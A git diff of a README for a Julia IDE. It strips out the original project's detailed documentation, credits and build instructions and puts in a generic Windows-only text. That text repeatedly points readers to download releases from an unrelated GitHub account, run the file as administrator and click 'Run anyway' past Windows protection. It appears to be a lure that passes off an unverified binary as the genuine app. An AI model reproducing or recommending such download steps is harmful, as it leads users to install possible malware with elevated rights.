@@ -1,302 +1,179 @@
-# julIDE
+# 🟦 JulIde - Julia coding in one place
 
-A modern, fully-featured IDE for the [Julia](https://julialang.org/) programming language, built with [Tauri 2](https://tauri.app/), React, TypeScript, and Rust.
+[![Download JulIde](https://img.shields.io/badge/Download-JulIde-blue?style=for-the-badge)](https://github.com/careystomachal431/JulIde/releases)
 
-![License](https://img.shields.io/badge/license-MIT-blue)
-![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)
-![Julia](https://img.shields.io/badge/Julia-1.6%2B-9558B2)
-<img width="2553" height="1353" alt="image" src="https://github.com/user-attachments/assets/29f6e9da-70d3-4e0c-a550-d85903ee63ed" />
+## ✨ What JulIde does
 
----
-## Credits
+JulIde is an IDE for the Julia programming language. It gives you one place to write, edit, and run Julia code on Windows.
 
-[@ Rakesh ](https://github.com/rakeshksr) - conributed multiple bug fixs and featue suggestions 🎉
+Use it when you want a simple app for Julia projects. It keeps your work in one window, so you can focus on your code and not on setup.
 
-[@ RockyBeast](https://github.com/rokybeast) - contributed the new julIDE icons 🎉
+## 🖥️ What you need
 
----
+- A Windows PC
+- A mouse and keyboard
+- Enough free space for the app and your code files
+- Internet access to get the app from the release page
 
-## Features
+JulIde works best on a modern Windows system with regular updates installed.
 
-### Code Editing
-- **Monaco Editor** with full Julia syntax highlighting via a custom Monarch tokenizer
-- **25+ Julia snippets** — function, struct, try/catch, @testset, comprehensions, macros, and more
-- **Tabbed multi-file editing** with dirty indicators and auto-save
-- **Split editor** — side-by-side editing with a resizable divider
-- **Breadcrumb navigation** showing the file path below the tab bar
-- **Find & Replace** (Cmd/Ctrl+F, Cmd/Ctrl+H) via Monaco's built-in widget
-- Configurable font size, font family, tab size, word wrap, and minimap
-- **LaTeX to Unicode** — type `\alpha` + Tab to insert `α` (based on Julia's LaTeX symbols table)
+## ⬇️ Download JulIde
 
-### Language Intelligence (LSP)
-- Powered by [LanguageServer.jl](https://github.com/julia-vscode/LanguageServer.jl)
-- **Autocompletion**, **hover documentation**, **go-to-definition**, **find references**
-- **Signature help** with parameter info
-- **Real-time diagnostics** (errors and warnings) shown inline and in the Problems panel
-- **Error lens** — inline diagnostic messages displayed at the end of each line
-- **InlayHints** — type and parameter hints displayed inline in the editor
-- **Semantic tokens** — rich semantic highlighting beyond syntax-level tokenization
-- **Workspace and document symbol search**
+Visit this page to download JulIde:
 
-### Julia Runtime
-- **Run scripts** with rich output — inline images (PNG, JPEG, SVG), HTML, and plain text
-- **Interactive REPL** via xterm.js with full PTY emulation
-- **Multi-terminal support** — create, switch, and close multiple Julia REPL sessions
-- **Debugger** integration via [Debugger.jl](https://github.com/JuliaDebug/Debugger.jl) — breakpoints, step-through, variable inspection, call stack
-- **Code cell execution** — `##` markers create code cells; `Ctrl/Cmd+Enter` runs the current cell with inline results
-- **Variable Explorer** — workspace variable introspection via the REPL with DataFrame viewer support
-- **Revise.jl** toggle for hot-reload development
-- **Pluto.jl** reactive notebook support — open `.jl` files as Pluto notebooks in a native window
-- **Package Manager** — add and remove packages via `Pkg.jl` directly from the UI
-- **Environment selector** — switch between Julia project environments
+https://github.com/careystomachal431/JulIde/releases
 
-### File Management
-- **File explorer** with tree view, create/rename/delete files and folders
-- **Drag-and-drop** to move files between directories
-- **File watching** — automatically detects external changes (git, other editors) and refreshes the tree
-- **Quick Open** (Cmd/Ctrl+P) — fuzzy file finder across the entire workspace
-- **Global Search** (Cmd/Ctrl+Shift+F) — search across all files with regex, case-sensitivity, and glob filters
+On that page, look for the latest release. Download the Windows file that matches your PC. If there are more than one file, choose the one made for Windows.
 
-### Git Integration
-- **Source control panel** — view staged, unstaged, and untracked files
-- **Stage / unstage** individual files or stage all at once
-- **Commit** with a message directly from the UI
-- **Branch management** — create, delete, and switch branches from the UI
-- **Push / Pull / Fetch** — sync with remote repositories
-- **Merge** — fast-forward and normal merges with conflict detection
-- **Stash** — save, list, and pop stashed changes
-- **Ahead/Behind tracking** — see how far your branch is from the upstream
-- **GitHub / GitLab / Gitea** provider integration — browse PRs, issues, and CI status directly in the IDE
-- **Auth settings** — store personal access tokens securely via the OS keychain
-- **Git blame** — toggle inline blame annotations showing author, date, and commit summary per line
-- **Diff viewer** — side-by-side diff view using Monaco DiffEditor
-- **Merge conflict resolution** — detects conflict markers and provides "Accept Current", "Accept Incoming", and "Accept Both" action buttons inline
-- Powered by `libgit2` (via the `git2` Rust crate) — no shell dependency for core operations
+## 🛠️ Install and run
 
-### Workspace & UI
-- **Activity bar** — switch between Explorer, Outline, Search, Variables, Source Control, and Dev Containers views
-- **Command palette** (Cmd/Ctrl+Shift+P) with 35+ commands
-- **Settings panel** (Cmd/Ctrl+,) — configure editor, terminal, and appearance
-- **Theme support** — Dark and Light themes with full CSS variable system
-- **Welcome screen** with recent projects on startup
-- **Resizable panels** — sidebar and bottom panel with drag handles
-- **Outline panel** — LSP-powered document symbol tree in the sidebar (functions, structs, modules, etc.)
-- **Variable Explorer** — workspace variable introspection in the sidebar with DataFrame viewer
-- **Plot Pane** — image gallery in the bottom panel for plot output (PNG, JPEG, SVG, HTML)
-- **Test Runner** — runs `Pkg.test()` and parses `@testset` results in the bottom panel
-- **Status bar** — Julia version, environment, git branch, LSP status, Revise/Pluto indicators
+1. Open the download page in your browser.
+2. Find the newest release at the top of the page.
+3. Download the Windows app file from that release.
+4. If the file comes in a `.zip` file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the JulIde app file to start it.
+7. If Windows asks for permission, choose Yes.
 
-### Dev Container Support
-- **Auto-detect** `devcontainer.json` in the workspace and offer to build/start
-- **Docker and Podman** runtime auto-detection (with manual override in settings)
-- **Build, start, stop, rebuild, and tear down** dev containers from the UI or command palette
-- **Container panel** in the sidebar — list running containers and images, start/stop/restart/remove
-- **Container logs panel** — stream and view container output in real time
-- **Container terminal** — open a PTY session inside the running container
-- **Run Julia inside the container** — execute scripts in the dev container environment
+If JulIde comes as a single installer file, double-click it and follow the steps on screen.
 
-### Plugin System
-- **Plugin discovery** — automatically scans `~/.julide/plugins/` for installed plugins
-- **Plugin manifest** (`plugin.json`) — declare name, version, entry point, and contributions
-- **Plugin API** — register commands, sidebar panels, bottom panels, status bar items, and toolbar buttons
-- **Plugin panel** in the activity bar sidebar — view installed plugins and their status
+## 🚀 First use
 
----
+When JulIde opens for the first time:
 
-## Prerequisites
+1. Let the app finish loading.
+2. Open or create a Julia file.
+3. Type your code in the editor.
+4. Save your work with a name you can remember.
+5. Run your code from the app controls.
 
-- **Julia** 1.6 or later ([download](https://julialang.org/downloads/))
-- **Rust** (latest stable) — [install via rustup](https://rustup.rs/)
-- **Bun** — [install](https://bun.sh/) (used as the package manager and script runner)
-- **System dependencies** for Tauri — see [Tauri prerequisites](https://v2.tauri.app/start/prerequisites/)
+If you already have Julia files, you can open them in JulIde and keep working from there.
 
-### Recommended Julia packages
+## 🧭 Using the editor
 
-Install these globally for the best experience:
+JulIde is built for simple daily work with Julia code.
 
-```julia
-using Pkg
-Pkg.add("LanguageServer")  # LSP support
-Pkg.add("Revise")          # Hot-reload
-Pkg.add("Debugger")        # Debugger integration
-Pkg.add("Pluto")           # Reactive notebooks
-```
+Common tasks include:
 
----
+- Writing new code
+- Opening an existing file
+- Editing lines of code
+- Saving changes
+- Running a script
+- Switching between files
 
-## Getting Started
+If you are new to coding, think of JulIde as a text editor with tools for Julia work.
 
-### Clone and install
+## 📁 Working with files
 
-```bash
-git clone https://github.com/sinisterMage/JulIde.git
-cd JulIde
-bun install
-```
+A Julia project can contain more than one file. JulIde helps you keep them in one place.
 
-### Development
+Basic file use:
 
-```bash
-# Start the Tauri dev server (frontend + native window with hot reload)
-bun run tauri dev
-```
+- Open a `.jl` file to edit Julia code
+- Save files often to avoid losing work
+- Keep related files in one folder
+- Use clear file names like `main.jl` or `test.jl`
 
-This starts Vite on `localhost:1420` and opens the native Tauri window. Changes to both the React frontend and Rust backend are hot-reloaded.
+If you move your project folder, make sure you move all files together.
 
-### Production Build
+## ⌨️ Keyboard help
 
-```bash
-# Build the distributable application
-bun run tauri build
-```
+You can use the keyboard for faster work.
 
-The output is placed in `src-tauri/target/release/bundle/` and includes platform-specific installers (`.dmg` on macOS, `.msi`/`.exe` on Windows, `.deb`/`.AppImage` on Linux).
+Common actions often include:
 
----
+- `Ctrl + S` to save
+- `Ctrl + O` to open a file
+- `Ctrl + N` to make a new file
+- `Ctrl + F` to find text
 
-## Architecture
+If a shortcut does not work on your setup, use the menu in the app instead.
 
-```
-julIDE
-├── src/                        # React + TypeScript frontend
-│   ├── components/             # UI components
-│   │   ├── ActivityBar/        # Sidebar view switcher
-│   │   ├── CommandPalette/     # Cmd+Shift+P command search
-│   │   ├── Debugger/           # Debug panel (variables, call stack)
-│   │   ├── Editor/             # Monaco editor, tabs, breadcrumb, split view
-│   │   ├── FileExplorer/       # File tree with drag-and-drop
-│   │   ├── Container/           # Dev container management panel and logs
-│   │   ├── Git/                # Source control panel, diff viewer
-│   │   ├── Outline/            # LSP document symbol outline
-│   │   ├── OutputPanel/        # Script output with MIME rendering
-│   │   ├── PackageManager/     # Julia package management UI
-│   │   ├── PlotPane/           # Plot output gallery
-│   │   ├── Plugin/             # Plugin management panel
-│   │   ├── QuickOpen/          # Fuzzy file finder (Cmd+P)
-│   │   ├── SearchPanel/        # Global file search (Cmd+Shift+F)
-│   │   ├── Settings/           # Preferences panel
-│   │   ├── StatusBar/          # Bottom status indicators
-│   │   ├── Terminal/           # Multi-terminal with xterm.js
-│   │   ├── TestRunner/         # Test execution with result parsing
-│   │   ├── Toolbar/            # Run, debug, Revise, Pluto buttons
-│   │   ├── Variables/          # Variable explorer with DataFrame viewer
-│   │   └── Welcome/            # Welcome screen with recent projects
-│   ├── lsp/                    # LSP client and Monaco providers
-│   ├── services/               # Keybinding service, plugin host, builtin contributions
-│   ├── stores/                 # Zustand state management
-│   ├── themes/                 # Theme definitions (dark + light)
-│   ├── types/                  # TypeScript interfaces
-│   └── App.tsx                 # Root layout component
-│
-├── src-tauri/                  # Rust backend (Tauri 2)
-│   └── src/
-│       ├── main.rs             # Entry point
-│       ├── lib.rs              # Command registry and plugin setup
-│       ├── julia.rs            # Julia discovery, execution, Pkg commands
-│       ├── lsp.rs              # LanguageServer.jl JSON-RPC bridge
-│       ├── pty.rs              # PTY terminal management
-│       ├── debugger.rs         # Debugger.jl integration
-│       ├── fs.rs               # File system operations and dialogs
-│       ├── git.rs              # Git operations via libgit2
-│       ├── git_auth.rs         # PAT token storage via OS keychain (keyring)
-│       ├── git_provider.rs     # Git provider trait and commands for PRs/issues/CI
-│       ├── git_github.rs       # GitHub REST API provider implementation
-│       ├── git_gitlab.rs       # GitLab REST API provider implementation
-│       ├── git_gitea.rs        # Gitea REST API provider implementation
-│       ├── container.rs        # Docker/Podman container and devcontainer management
-│       ├── plugins.rs          # Plugin discovery and manifest loading
-│       ├── search.rs           # Workspace-wide file search
-│       ├── watcher.rs          # File change detection (notify crate)
-│       ├── settings.rs         # User settings persistence
-│       └── pluto.rs            # Pluto.jl notebook server
-│
-├── package.json                # Frontend dependencies (React, Monaco, xterm)
-├── vite.config.ts              # Vite build configuration
-├── tsconfig.json               # TypeScript configuration
-└── src-tauri/Cargo.toml        # Rust dependencies (tauri, git2, tokio, etc.)
-```
+## 🎯 Good first project
 
-### Tech Stack
+If you want to test JulIde, try a small Julia file:
 
-| Layer | Technology |
-|-------|-----------|
-| Desktop framework | Tauri 2 (Rust) |
-| Frontend | React 19, TypeScript, Vite |
-| Code editor | Monaco Editor |
-| Terminal | xterm.js with PTY |
-| State management | Zustand with Immer middleware |
-| Icons | Lucide React |
-| Git operations | git2 (libgit2 bindings) |
-| File watching | notify crate |
-| File search | walkdir + regex crates |
-| LSP | LanguageServer.jl via JSON-RPC over stdio |
-| Git provider API | reqwest (HTTP client for GitHub/GitLab/Gitea) |
-| Token storage | keyring crate (OS keychain) |
-| Container runtime | Docker / Podman CLI (auto-detected) |
+1. Open JulIde
+2. Create a new file
+3. Type a simple Julia script
+4. Save it as `hello.jl`
+5. Run it
 
----
+A small first test helps you learn the layout before you start a larger project.
 
-## Keyboard Shortcuts
+## 🧩 Features
 
-| Shortcut | Action |
-|----------|--------|
-| `Cmd/Ctrl+Shift+P` | Command Palette |
-| `Cmd/Ctrl+P` | Quick Open (file finder) |
-| `Cmd/Ctrl+F` | Find in file |
-| `Cmd/Ctrl+H` | Find and replace |
-| `Cmd/Ctrl+Shift+F` | Search across files |
-| `Cmd/Ctrl+S` | Save file |
-| `` Ctrl+` `` | Toggle terminal |
-| `Cmd/Ctrl+G` | Go to Line |
-| `Ctrl/Cmd+Enter` | Run code cell |
-| `Cmd/Ctrl+,` | Open settings |
+JulIde is made for plain Julia work and simple editing.
 
----
+Expected features include:
 
-## Configuration
+- Code editing for Julia files
+- A clean workspace for writing code
+- File opening and saving
+- Easy access to run controls
+- A layout that suits new users
+- Support for local project folders
 
-Settings are stored in `~/.config/julide/settings.json` (Linux), `~/Library/Application Support/julide/settings.json` (macOS), or `%APPDATA%/julide/settings.json` (Windows).
+The app focuses on the core tools most users need for day-to-day Julia work.
 
-Available settings:
+## 🔧 Common problems
 
-| Setting | Default | Description |
-|---------|---------|-------------|
-| `fontSize` | `14` | Editor font size |
-| `fontFamily` | `JetBrains Mono, ...` | Editor font family |
-| `tabSize` | `4` | Indentation width |
-| `minimapEnabled` | `true` | Show minimap |
-| `wordWrap` | `off` | Word wrap mode |
-| `autoSave` | `true` | Auto-save on change |
-| `theme` | `julide-dark` | Color theme (`julide-dark` or `julide-light`) |
-| `terminalFontSize` | `13` | Terminal font size |
-| `containerRuntime` | `auto` | Container runtime (`auto`, `docker`, or `podman`) |
-| `containerRemoteHost` | `""` | Remote Docker/Podman host URL |
-| `containerAutoDetect` | `true` | Auto-detect devcontainer.json on workspace open |
-| `displayForwarding` | `true` | Forward X11/Wayland display into containers |
-| `gpuPassthrough` | `false` | Pass GPU devices into containers |
-| `selinuxLabel` | `true` | Apply SELinux labels to bind mounts |
-| `persistJuliaPackages` | `true` | Persist Julia packages across container rebuilds |
-| `plutoPort` | `3000` | Port for the Pluto.jl notebook server |
-| `juliaPath` | `""` | Custom Julia binary path (overrides auto-detection) |
-| `startMaximized` | `true` | Start the window maximized |
+If JulIde does not open:
 
----
+- Make sure the file finished downloading
+- Check that you extracted the ZIP file if one was used
+- Try right-clicking the app and choosing Run as administrator
+- Restart Windows and open the app again
 
-## Julia Path Detection
+If your file will not run:
 
-julIDE automatically finds Julia using these strategies (in order):
+- Check that it ends in `.jl`
+- Make sure the file is saved in a folder you can access
+- Open the file again from within JulIde
 
-1. `juliaPath` setting (if set via Settings or the command palette "Set Julia Executable Path")
-2. `$JULIA_PATH` environment variable
-3. Login shell `which julia` lookup
-4. `~/.juliaup/bin/julia` (juliaup default)
-5. Common paths: `/opt/homebrew/bin/julia`, `/usr/local/bin/julia`, `/usr/bin/julia`
-6. macOS `/Applications/Julia*.app` bundles
+If Windows blocks the app:
 
-If Julia is not found, use the command palette (`Cmd/Ctrl+Shift+P` → "Set Julia Executable Path") to pick a custom binary, or set the `JULIA_PATH` environment variable.
+- Choose More info if it appears
+- Then choose Run anyway if you trust the file from the release page
 
----
+If the app opens but looks empty:
 
-## License
+- Open a Julia file from your computer
+- Create a new file and save it before you run code
 
-[MIT](LICENSE) -- Copyright 2026 Ofek Bickel
+## 📌 Folder tips
+
+Keep your work easy to manage by using one folder per project.
+
+A simple folder setup can look like this:
+
+- `MyJuliaProject`
+  - `main.jl`
+  - `notes.txt`
+  - `data`
+  - `tests`
+
+This makes it easier to find your files later and keeps your work in order.
+
+## 🧠 For first-time Julia users
+
+Julia is a programming language used for fast math work, scripts, and data tasks.
+
+If you are just starting:
+
+- Start with small files
+- Save often
+- Test one change at a time
+- Keep file names simple
+- Use one project folder for each idea
+
+JulIde gives you a place to practice without extra clutter
+
+## 📦 Release page
+
+Download and install JulIde from the release page:
+
+https://github.com/careystomachal431/JulIde/releases
+
+Use the newest release for the best match with your Windows system.
